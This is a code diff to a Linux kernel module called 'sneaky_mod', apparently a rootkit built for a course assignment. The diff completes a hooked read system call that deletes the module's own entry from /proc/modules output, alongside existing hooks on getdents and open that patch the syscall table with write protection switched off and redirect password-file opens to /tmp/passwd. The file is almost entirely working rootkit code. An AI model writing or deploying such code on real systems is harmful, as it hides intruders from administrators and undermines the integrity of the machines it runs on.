@@ -48,7 +48,10 @@ asmlinkage int (*original_sys_getdents)(unsigned int fd,
                                         struct linux_dirent * dirp,
                                         unsigned int count);
 asmlinkage int (*original_sys_open)(const char * pathname, int flags, mode_t mode);
-//asmlinkage ssize_t (*original_sys_read)(int fd, void * buf, size_t count);
+asmlinkage ssize_t (*original_sys_read)(int fd, void * buf, size_t count);
+
+//
+static int proc_modules_open = 0;
 
 //Define our new sneaky version of the 'getdents' syscall
 asmlinkage int sneaky_sys_getdents(unsigned int fd,
@@ -77,14 +80,28 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags, mode_t mode)
     const char *cpyfile = "/tmp/passwd";
     copy_to_user((char*)pathname, cpyfile, sizeof(cpyfile));
   }
+  if(strcmp(pathname, "/proc/modules") == 0){
+    proc_modules_open = 1;
+  }
   return original_sys_open(pathname, flags, mode);
 }
-/*
+
 //Define our new sneaky version of the 'read' syscall
 asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count){
-  //TODO
+  ssize_t nread = original_sys_read(fd, buf, count);
+  if(proc_modules_open == 1){
+    char *sneaky = strstr((char*)buf, "sneaky_mod");
+    if(sneaky != NULL){
+      char *nextline = strchr(sneaky, '\n') + 1;
+      int to_move = (char*)buf + nread - nextline;
+      memmove(sneaky, nextline, to_move);
+      proc_modules_open = 0;
+      nread -= (nextline - sneaky);
+    }
+  }
+  return nread;
 }
-*/
+
 //The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void) {
   struct page * page_ptr;
@@ -111,10 +128,9 @@ static int initialize_sneaky_module(void) {
   original_sys_open = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
   //"read" system call
-  /*
   original_sys_read = (void*)*(sys_call_table + __NR_read);
   *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
-  */
+  
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
@@ -141,7 +157,7 @@ static void exit_sneaky_module(void) {
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_getdents) = (unsigned long)original_sys_getdents;
   *(sys_call_table + __NR_open) = (unsigned long)original_sys_open;
-  //*(sys_call_table + __NR_read) = (unsigned long)original_sys_read;
+  *(sys_call_table + __NR_read) = (unsigned long)original_sys_read;
   
   //Revert page to read-only
   pages_ro(page_ptr, 1);
@@ -149,5 +165,6 @@ static void exit_sneaky_module(void) {
   write_cr0(read_cr0() | 0x10000);
 }
 
+MODULE_LICENSE("kw300");
 module_init(initialize_sneaky_module);  // what's called upon loading
 module_exit(exit_sneaky_module);        // what's called upon unloading
